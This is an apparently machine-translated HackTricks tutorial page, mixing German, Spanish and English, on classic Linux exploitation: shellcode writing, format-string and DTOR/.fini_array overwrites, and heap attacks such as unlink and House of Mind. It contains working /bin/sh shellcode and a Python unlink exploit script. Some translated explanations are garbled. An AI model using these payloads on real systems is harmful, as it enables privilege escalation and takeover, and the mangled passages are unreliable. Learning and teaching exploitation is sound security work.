# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## **2.SHELLCODE**

Siehe Kernel-Unterbrechungen: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; l√∂schen von eax\
xor ebx, ebx ; ebx = 0 da kein Argument √ºbergeben wird\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Syscall ausf√ºhren

**nasm -f elf assembly.asm** ‚Äî> Gibt uns eine .o-Datei zur√ºck\
**ld assembly.o -o shellcodeout** ‚Äî> Erzeugt eine ausf√ºhrbare Datei aus dem Assemblercode, aus der wir die Opcodes mit **objdump** extrahieren k√∂nnen\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Um sicherzustellen, dass es sich tats√§chlich um unseren Shellcode handelt und um die Opcodes zu extrahieren

**√úberpr√ºfen Sie, ob der Shellcode funktioniert**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para confirmar, dass Systemaufrufe korrekt ausgef√ºhrt werden, muss das vorherige Programm kompiliert werden und die Systemaufrufe sollten in **strace ./KOMPILIERTE\_PROGRAMM** erscheinen.

Beim Erstellen von Shellcodes kann ein Trick angewendet werden. Die erste Anweisung ist ein Sprung zu einem Aufruf. Der Aufruf ruft den Originalcode auf und legt zus√§tzlich das EIP im Stack ab. Nach dem Aufruf haben wir den ben√∂tigten String platziert, sodass wir mit diesem EIP auf den String zeigen und gleichzeitig den Code weiter ausf√ºhren k√∂nnen.

BEISPIEL **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ mit dem Stack(/bin/sh) verwenden:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV ist ein einfacher Exploit, der die FNSTENV-Anweisung verwendet, um den FPU-Zustand zu speichern. Dieser Exploit ist besonders n√ºtzlich, wenn Sie versuchen, Shellcode in einem Umfeld auszuf√ºhren, in dem der FPU-Zustand nicht korrekt gespeichert wird.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Besteht aus einem kleinen Code, der die Speicherseiten eines Prozesses nach der darin gespeicherten Shellcode durchsucht (sucht nach einer Signatur im Shellcode). N√ºtzlich in F√§llen, in denen nur wenig Platz zum Einspritzen von Code zur Verf√ºgung steht.

**Polymorphe Shellcodes**

Sind verschl√ºsselte Shells, die √ºber kleine Codes verf√ºgen, die sie entschl√ºsseln und zu ihnen springen lassen, unter Verwendung des Call-Pop-Tricks w√§re dies ein **Beispiel f√ºr eine Caesar-Verschl√ºsselung**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Zus√§tzliche Methoden**

**Ret2Ret**

N√ºtzlich, wenn die Adresse des Stacks nicht in den EIP eingef√ºgt werden kann (√ºberpr√ºfen, dass der EIP nicht 0xbf enth√§lt) oder wenn der Speicherort der Shellcode nicht berechnet werden kann. Wenn die verwundbare Funktion jedoch einen Parameter akzeptiert (hier wird der Shellcode platziert).

Durch das √Ñndern des EIP in eine Adresse zu einem **ret** wird die n√§chste Adresse geladen (die Adresse des ersten Arguments der Funktion). Mit anderen Worten, der Shellcode wird geladen.

Der Exploit w√ºrde sein: SHELLCODE + Padding (bis zum EIP) + **\&ret** (die n√§chsten Bytes im Stack zeigen auf den Beginn des Shellcodes, da die Adresse des √ºbergebenen Parameters im Stack platziert wird)

Es scheint, dass Funktionen wie **strncpy** nach Abschluss die Adresse, an der der Shellcode gespeichert war, aus dem Stack entfernen und diese Technik unm√∂glich machen. Mit anderen Worten, die Adresse, die der Funktion als Argument √ºbergeben wird (die den Shellcode speichert), wird durch eine 0x00 ersetzt, sodass beim Aufruf des zweiten **ret** ein 0x00 gefunden wird und das Programm abst√ºrzt.



**Murats Technik**

In Linux werden alle Programme ab 0xbfffffff gemappt.

Durch das Betrachten des Aufbaus des Stacks eines neuen Prozesses in Linux kann ein Exploit entwickelt werden, sodass das Programm in einer Umgebung gestartet wird, in der nur eine Variable vorhanden ist, n√§mlich der Shellcode. Die Adresse dieser Variable kann dann berechnet werden als: addr = 0xbfffffff - 4 - strlen(KOMPLETTER\_AUSF√úHRBARER\_NAME) - strlen(shellcode)

Auf diese Weise kann die Adresse, an der sich die Umgebungsvariable mit dem Shellcode befindet, einfach erhalten werden.

Dies ist m√∂glich, da die Funktion execle es erm√∂glicht, eine Umgebung zu erstellen, die nur die gew√ºnschten Umgebungsvariablen enth√§lt.

**Integer-√úberl√§ufe**

Diese Art von √úberl√§ufen tritt auf, wenn eine Variable nicht darauf vorbereitet ist, eine so gro√üe Zahl zu verarbeiten, wie ihr √ºbergeben wird, m√∂glicherweise aufgrund einer Verwechslung zwischen vorzeichenbehafteten und vorzeichenlosen Variablen, zum Beispiel:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el previous example we see that the program expects 2 parameters. The first one is the length of the next string and the second one is the string.

If we pass a negative number as the first parameter, it will show that len < 256 and we will bypass that filter, and also strlen(buffer) will be less than l, since l is an unsigned int and will be very large.

This type of overflows does not aim to write something in the program's process, but to bypass poorly designed filters to exploit other vulnerabilities.

**Uninitialized Variables**

The value that an uninitialized variable can take is unknown and it could be interesting to observe it. It may take the value that a variable from the previous function took and this may be controlled by the attacker.

##

###

###

###

### **.fini\_array**

Grunds√§tzlich handelt es sich hierbei um eine Struktur mit **Funktionen, die aufgerufen werden**, bevor das Programm beendet wird. Dies ist interessant, wenn Sie Ihren **Shellcode aufrufen k√∂nnen, indem Sie zu einer Adresse springen**, oder in F√§llen, in denen Sie erneut zu main zur√ºckkehren m√ºssen, um die **Format-String ein zweites Mal auszunutzen**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Hinweis, dass dies **keine** **endlose Schleife** erzeugt, da der Canary bemerken wird, dass das Ende des Stapels m√∂glicherweise besch√§digt ist und die Funktion nicht erneut aufgerufen wird. Daher k√∂nnen Sie mit diesem **1 weitere Ausf√ºhrung** der Schwachstelle haben.

### **Format Strings zum Dumpen von Inhalten**

Eine Formatzeichenkette kann auch missbraucht werden, um Inhalte aus dem Speicher des Programms zu **dumpen**.\
Zum Beispiel gibt es in der folgenden Situation eine **lokale Variable im Stapel, die auf eine Flagge zeigt**. Wenn Sie herausfinden, wo im **Speicher** der **Zeiger** auf die **Flagge** ist, k√∂nnen Sie **printf** dazu bringen, auf diese **Adresse** zuzugreifen und die **Flagge** auszugeben:

Also, die Flagge ist in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Und aus dem Leak k√∂nnen Sie sehen, dass der **Zeiger auf die Flagge** im **8.** Parameter liegt:

![](<../../.gitbook/assets/image (623).png>)

Daher k√∂nnen Sie durch **Zugriff auf den 8. Parameter** die Flagge erhalten:

![](<../../.gitbook/assets/image (624).png>)

Beachten Sie, dass Sie nach dem **vorherigen Exploit** und der Erkenntnis, dass Sie Inhalte **leaken** k√∂nnen, **Zeiger** auf **`printf`** in den Abschnitt setzen k√∂nnen, in dem das **ausf√ºhrbare** Programm **geladen** ist, und es **vollst√§ndig dumpen**!

### **DTOR**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, ein Bin√§r mit einem DTOR-Abschnitt zu finden**.
{% endhint %}

Die Destruktoren sind Funktionen, die **ausgef√ºhrt werden, bevor das Programm endet**.\
Wenn es Ihnen gelingt, eine **Adresse** zu einem **Shellcode** in **`__DTOR_END__`** zu **schreiben**, wird dies **ausgef√ºhrt**, bevor das Programm endet.\
Holen Sie sich die Adresse dieses Abschnitts mit:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
In der Regel finden Sie den **DTOR**-Abschnitt **zwischen** den Werten `ffffffff` und `00000000`. Wenn Sie also nur diese Werte sehen, bedeutet das, dass **keine Funktion registriert ist**. √úberschreiben Sie also die **`00000000`** mit der **Adresse** des **Shellcodes**, um ihn auszuf√ºhren.

### **Format Strings f√ºr Buffer Overflows**

**sprintf** kopiert einen formatierten String in eine **Variable**. Daher k√∂nnten Sie die **Formatierung** eines Strings missbrauchen, um einen **Buffer Overflow in der Variable** zu verursachen.\
Beispielsweise schreibt das Payload `%.44xAAAA` 44B+"AAAA" in die Variable, was einen Buffer Overflow verursachen kann.

### **\_\_atexit-Strukturen**

{% hint style="danger" %}
Heutzutage ist es sehr **ungew√∂hnlich, dies auszunutzen**.
{% endhint %}

**`atexit()`** ist eine Funktion, der **andere Funktionen als Parameter √ºbergeben werden**. Diese **Funktionen** werden ausgef√ºhrt, wenn ein **`exit()`** ausgef√ºhrt wird oder das **Hauptprogramm beendet wird**.\
Wenn Sie die **Adresse** einer dieser **Funktionen** beispielsweise auf einen Shellcode zeigen lassen k√∂nnen, erhalten Sie **Kontrolle** √ºber den **Prozess**, aber dies ist derzeit komplizierter.\
Derzeit sind die **Adressen der auszuf√ºhrenden Funktionen** hinter mehreren Strukturen versteckt, und schlie√ülich sind die Adressen, auf die sie zeigen, nicht die Adressen der Funktionen, sondern sind **verschl√ºsselt mit XOR** und Verschiebungen mit einem **zuf√§lligen Schl√ºssel**. Daher ist dieser Angriffsvektor derzeit **zumindest auf x86** und **x64\_86** nicht sehr n√ºtzlich.\
Die **Verschl√ºsselungsfunktion** ist **`PTR_MANGLE`**. **Andere Architekturen** wie m68k, mips32, mips64, aarch64, arm, hppa... **implementieren die Verschl√ºsselungsfunktion nicht**, da sie das Gleiche zur√ºckgeben wie sie als Eingabe erhalten haben. Daher w√§ren diese Architekturen durch diesen Vektor angreifbar.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Heutzutage ist es sehr **ungew√∂hnlich, dies auszunutzen**.
{% endhint %}

**`Setjmp()`** erm√∂glicht es, den **Kontext** (die Register) zu **speichern**.\
**`longjmp()`** erm√∂glicht es, den **Kontext** zu **wiederherstellen**.\
Die **gespeicherten Register** sind: `EBX, ESI, EDI, ESP, EIP, EBP`\
Das Problem ist, dass EIP und ESP durch die **`PTR_MANGLE`**-Funktion √ºbergeben werden, daher sind die **Architekturen, die anf√§llig f√ºr diesen Angriff sind, die gleichen wie oben**.\
Sie sind n√ºtzlich f√ºr Fehlerbehebung oder Unterbrechungen.\
Jedoch sind nach meinen Recherchen die anderen Register nicht gesch√ºtzt, **so dass bei einem `call ebx`, `call esi` oder `call edi`** innerhalb der aufgerufenen Funktion die Kontrolle √ºbernommen werden kann. Oder Sie k√∂nnten auch EBP √§ndern, um ESP zu √§ndern.

**VTable und VPTR in C++**

Jede Klasse hat eine **Vtable**, die ein Array von **Methodenzeigern** ist.

Jedes Objekt einer **Klasse** hat einen **VPtr**, der ein **Zeiger** auf das Array seiner Klasse ist. Der VPtr ist Teil des Headers jedes Objekts, daher k√∂nnte bei einer **√úberschreibung** des **VPtr** dieser auf eine Dummy-Methode zeigen, sodass beim Ausf√ºhren einer Funktion der Shellcode aufgerufen wird.

## **Pr√§ventivma√ünahmen und Umgehungen**

###

**Ersetzen von Libsafe**

Aktivieren mit: LD\_PRELOAD=/lib/libsafe.so.2\
oder\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Einige unsichere Funktionen werden durch sichere Funktionen ersetzt. Nicht standardisiert. (nur f√ºr x86, nicht f√ºr Kompilierungen mit -fomit-frame-pointer, nicht f√ºr statische Kompilierungen, nicht alle anf√§lligen Funktionen werden sicher gemacht und LD\_PRELOAD funktioniert nicht bei SUID-Bin√§rdateien).

**ASCII-gesch√ºtzter Adressraum**

L√§dt gemeinsam genutzte Bibliotheken von 0x00000000 bis 0x00ffffff, damit immer ein Byte 0x00 vorhanden ist. Dies h√§lt jedoch praktisch keinen Angriff auf, insbesondere nicht bei Little Endian.

**ret2plt**

F√ºhrt ein ROP aus, bei dem die Funktion strcpy@plt (aus der plt) aufgerufen wird und auf den Eintrag der GOT gezeigt wird und das erste Byte der zu aufrufenden Funktion (system()) kopiert wird. Anschlie√üend wird dasselbe mit GOT+1 gemacht und das 2. Byte von system() kopiert... Schlie√ülich wird die in der GOT gespeicherte Adresse aufgerufen, die system() sein wird.

**Chroot-K√§fige**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installiert ein grundlegendes System unter einem bestimmten Unterverzeichnis

Ein Administrator kann aus einem dieser K√§fige ausbrechen, indem er: mkdir foo; chroot foo; cd ..

**Codeinstrumentierung**

Valgrind ‚Äî> Sucht nach Fehlern\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Grundlegende Exploits**

**Zugewiesenes St√ºck**

prev\_size |\
size | ‚ÄîHeader\
\*mem | Daten

**Freies St√ºck**

prev\_size |\
size |\
\*fd | Zeiger auf vorheriges St√ºck\
\*bk | Zeiger auf n√§chstes St√ºck ‚ÄîHeader\
\*mem | Daten

Die freien St√ºcke sind in einer doppelt verketteten Liste (bin) und es d√ºrfen niemals zwei freie St√ºcke nebeneinander sein (sie werden zusammengef√ºhrt).

Im "size"-Feld gibt es Bits, um anzuzeigen: ob das vorherige St√ºck verwendet wird, ob das St√ºck √ºber mmap() zugewiesen wurde und ob das St√ºck zum prim√§ren Arena geh√∂rt.

Wenn ein St√ºck freigegeben wird und eines der benachbarten St√ºcke frei ist, werden sie durch die Makro unlink() fusioniert und das gr√∂√üere neue St√ºck wird frontlink() √ºbergeben, um es in den entsprechenden Bin einzuf√ºgen.

unlink(){\
BK = P->bk; ‚Äî> Das BK des neuen St√ºcks ist das, was das zuvor freie St√ºck hatte\
FD = P->fd; ‚Äî> Das FD des neuen St√ºcks ist das, was das zuvor freie St√ºck hatte\
FD->bk = BK; ‚Äî> Das BK des n√§chsten St√ºcks zeigt auf das neue St√ºck\
BK->fd = FD; ‚Äî> Das FD des vorherigen St√ºcks zeigt auf das neue St√ºck\
}

Daher, wenn es gelingt, P->bk mit der Adresse eines Shellcodes und P->fd mit der Adresse eines Eintrags in der GOT oder DTORS minus 12 zu √§ndern, wird erreicht:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Dadurch wird der Shellcode beim Verlassen des Programms ausgef√ºhrt.

Au√üerdem schreibt die 4. Anweisung von unlink() etwas und der Shellcode muss daf√ºr angepasst werden:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Dies f√ºhrt dazu, dass 4 Bytes ab dem 8. Byte des Shellcodes geschrieben werden, daher sollte das erste Shellcode-Instruction ein Sprungbefehl sein, um dies zu √ºberspringen und zu den Nops zu gelangen, die zum Rest des Shellcodes f√ºhren.

Daher wird der Exploit erstellt:

Im Puffer1 wird der Shellcode platziert, beginnend mit einem Sprungbefehl, damit er zu den Nops oder zum Rest des Shellcodes gelangt.

Nach dem Shellcode wird F√ºllmaterial eingef√ºgt, bis die Felder prev\_size und size des n√§chsten St√ºcks erreicht sind. An diesen Stellen werden 0xfffffff0 (um prev\_size zu √ºberschreiben, damit das Bit angezeigt wird, dass es frei ist) und "-4" (0xfffffffc) in die size eingef√ºgt (um sicherzustellen, dass beim √úberpr√ºfen des 3. St√ºcks auf Freiheit des 2. St√ºcks tats√§chlich auf die modifizierte prev\_size verwiesen wird, die angibt, dass es frei ist) -> Wenn free() √ºberpr√ºft, wird zur size des 3. St√ºcks gegangen, aber tats√§chlich wird auf das 2. - 4. St√ºck verwiesen und es wird angenommen, dass das 2. St√ºck frei ist. Dann wird **unlink()** aufgerufen.

Beim Aufruf von unlink() werden die ersten Daten des 2. St√ºcks als P->fd verwendet, sodass die Adresse √ºberschrieben wird, die - 12 (da FD->bk 12 zur in FD gespeicherten Adresse hinzuf√ºgt) . An dieser Adresse wird die zweite Adresse im 2. St√ºck eingef√ºgt, die die Adresse des Shellcodes sein soll (falsches P->bk).

**from struct import \***

**import os**
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Wir kontrollieren 3 aufeinanderfolgende Chunks und geben sie in umgekehrter Reihenfolge frei.

In diesem Fall:

Im Chunk c wird der Shellcode platziert.

Der Chunk a wird verwendet, um das b zu √ºberschreiben, so dass das Bit PREV\_INUSE deaktiviert wird, damit der Chunk a als frei betrachtet wird.

Au√üerdem wird die Gr√∂√üe im Header b √ºberschrieben, damit sie -4 betr√§gt.

Dann wird das Programm denken, dass "a" frei ist und in einem Bin liegt, daher wird unlink() aufgerufen, um es zu entkoppeln. Da jedoch die Headergr√∂√üe PREV\_SIZE -4 betr√§gt, wird angenommen, dass der "a"-Chunk tats√§chlich bei b+4 beginnt. Das hei√üt, es wird ein unlink() auf einen Chunk durchgef√ºhrt, der bei b+4 beginnt. Daher wird bei b+12 der "fd"-Pointer und bei b+16 der "bk"-Pointer sein.

Auf diese Weise, wenn wir die Adresse des Shellcodes in bk und die Adresse der Funktion "puts()" -12 in fd setzen, haben wir unser Payload.

**Frontlink-Technik**

Frontlink wird aufgerufen, wenn etwas freigegeben wird und keiner seiner benachbarten Chunks frei ist. Es wird nicht unlink() aufgerufen, sondern direkt frontlink().

N√ºtzliche Schwachstelle, wenn das angegriffene malloc nie freigegeben wird (free()).

Ben√∂tigt werden:

Ein Puffer, der mit der Eingabefunktion √ºberlaufen kann.

Ein benachbarter Puffer, der freigegeben werden muss und dessen fd-Feld im Header durch den √úberlauf des vorherigen Puffers ge√§ndert wird.

Ein Puffer, der gr√∂√üer als 512, aber kleiner als der vorherige Puffer freigegeben wird.

Ein Puffer, der vor Schritt 3 deklariert wird, um das prev\_size dieses Puffers zu √ºberschreiben.

Dadurch k√∂nnen wir in zwei mallocs unkontrolliert und in einem kontrolliert √ºberschreiben und einen Exploit erstellen.

**Vulnerabilit√§t double free()**

Wenn free() zweimal mit demselben Zeiger aufgerufen wird, zeigen zwei Bins auf dieselbe Adresse.

Wenn einer erneut verwendet werden soll, wird er ohne Probleme zugewiesen. Wenn der andere verwendet werden soll, wird ihm derselbe Speicherplatz zugewiesen, sodass die "fd"- und "bk"-Pointer mit den Daten gef√§lscht werden, die die vorherige Reservierung schreibt.

**After free()**

Ein zuvor freigegebener Zeiger wird erneut ohne Kontrolle verwendet.

## **8 Heap-√úberl√§ufe: Fortgeschrittene Exploits**

Die Techniken Unlink() und FrontLink() wurden entfernt, als die Funktion unlink() ge√§ndert wurde.

**The house of mind**

Es ist nur ein Aufruf von free() erforderlich, um die Ausf√ºhrung beliebigen Codes zu verursachen. Es ist wichtig, einen zweiten Chunk zu finden, der von einem vorherigen √ºberlaufen und freigegeben werden kann.

Ein Aufruf von free() f√ºhrt dazu, dass public\_fREe(mem) aufgerufen wird, das Folgendes ausf√ºhrt:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Gibt einen Zeiger auf die Adresse zur√ºck, an der der Chunk beginnt (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] wird das Feld size und das Bit NON\_MAIN\_ARENA √ºberpr√ºft, das ge√§ndert werden kann, damit die √úberpr√ºfung true zur√ºckgibt und heap\_for\_ptr() ausgef√ºhrt wird, das ein "and" auf "mem" ausf√ºhrt und die 2,5 unwichtigsten Bytes auf 0 setzt (in unserem Fall von 0x0804a000 auf 0x08000000) und auf 0x08000000->ar\_ptr zugreift (als ob es sich um ein struct heap\_info handelt).

Auf diese Weise, wenn wir beispielsweise einen Chunk bei 0x0804a000 kontrollieren und ein Chunk bei **0x081002a0** freigegeben wird, k√∂nnen wir die Adresse 0x08100000 erreichen und beispielsweise **0x0804a000** schreiben. Wenn dieser zweite Chunk freigegeben wird, wird heap\_for\_ptr(ptr)->ar\_ptr den Wert zur√ºckgeben, den wir in 0x08100000 geschrieben haben (da auf 0x081002a0 das zuvor erw√§hnte "and" angewendet wird und von dort der Wert der ersten 4 Bytes, ar\_ptr, abgeleitet wird).

Dann wird \_int\_free(ar\_ptr, mem) aufgerufen, d.h. **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Wie wir zuvor gesehen haben, k√∂nnen wir den Wert von av kontrollieren, da wir ihn in dem Chunk geschrieben haben, der freigegeben wird.

Wie unsorted\_chunks definiert ist, wissen wir, dass:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Daher, wenn wir in av->bins\[2] den Wert von \_\_DTOR\_END\_\_-12 schreiben, wird in der letzten Anweisung in \_\_DTOR\_END\_\_ die Adresse des zweiten Chunks geschrieben.

Das hei√üt, wir m√ºssen am Anfang des ersten Chunks viele Male die Adresse von \_\_DTOR\_END\_\_-12 platzieren, weil av->bins\[2] sie von dort abruft.

An der Adresse, an der die Adresse des zweiten Chunks mit den letzten 5 Nullen landet, m√ºssen wir die Adresse dieses ersten Chunks platzieren, damit heap\_for\_ptr() denkt, dass ar\_ptr am Anfang des ersten Chunks liegt und av->bins\[2] von dort abruft.

Im zweiten Chunk und dank des ersten √ºberschreiben wir prev\_size mit einem Sprung von 0x0c und size mit etwas, um -> NON\_MAIN\_ARENA zu aktivieren.

Dann f√ºgen wir viele Nops und schlie√ülich den Shellcode in den zweiten Chunk ein.

Auf diese Weise wird \_int\_free(CHUNK1, CHUNK2) aufgerufen und die Anweisungen werden befolgt, um in \_\_DTOR\_END\_\_ die Adresse von prev\_size des CHUNK2 zu schreiben, der dann zum Shellcode springt.
Um diese Technik anzuwenden, m√ºssen einige zus√§tzliche Anforderungen erf√ºllt sein, die den Payload etwas komplizierter machen.

Diese Technik ist nicht mehr anwendbar, da fast der gleiche Patch wie f√ºr unlink angewendet wurde. Es wird √ºberpr√ºft, ob die neue Site, auf die verwiesen wird, auch auf sie verweist.

**Fastbin**

Es ist eine Variante von The House of Mind

Wir m√∂chten den folgenden Code ausf√ºhren, der nach der ersten √úberpr√ºfung der Funktion \_int\_free() erreicht wird

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> wobei fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Auf diese Weise, wenn "fb" auf die Adresse einer Funktion in der GOT gesetzt wird, wird an dieser Adresse die Adresse des √ºberschriebenen Chunks platziert. Daf√ºr muss die Arena in der N√§he der dtors-Adressen liegen. Genauer gesagt muss av->max\_fast an der Adresse stehen, die wir √ºberschreiben werden.

Da wir mit The House of Mind gesehen haben, dass wir die Position von av kontrollierten.

Deshalb, wenn wir in das Feld size eine Gr√∂√üe von 8 + NON\_MAIN\_ARENA + PREV\_INUSE setzen, wird fastbin\_index() fastbins\[-1] zur√ºckgeben, das auf av->max\_fast zeigen wird.

In diesem Fall wird av->max\_fast die Adresse sein, die √ºberschrieben wird (nicht die, auf die verwiesen wird, sondern diese Position wird √ºberschrieben).

Au√üerdem muss der benachbarte Chunk des freigegebenen Chunks gr√∂√üer als 8 sein -> Da wir gesagt haben, dass die Gr√∂√üe des freigegebenen Chunks 8 betr√§gt, m√ºssen wir in diesem falschen Chunk nur eine Gr√∂√üe gr√∂√üer als 8 setzen (da die Shellcode im freigegebenen Chunk sein wird, muss am Anfang ein jmp stehen, der auf nops zeigt).

Au√üerdem muss dieser falsche Chunk kleiner als av->system\_mem sein. av->system\_mem befindet sich 1848 Bytes weiter.

Aufgrund der Nullen von \_DTOR\_END\_ und der wenigen Adressen in der GOT sind keine dieser Adressen geeignet, um √ºberschrieben zu werden. Sehen wir also, wie wir fastbin anwenden k√∂nnen, um den Stack anzugreifen.

Eine andere Angriffsmethode besteht darin, den **av** auf den Stack umzuleiten.

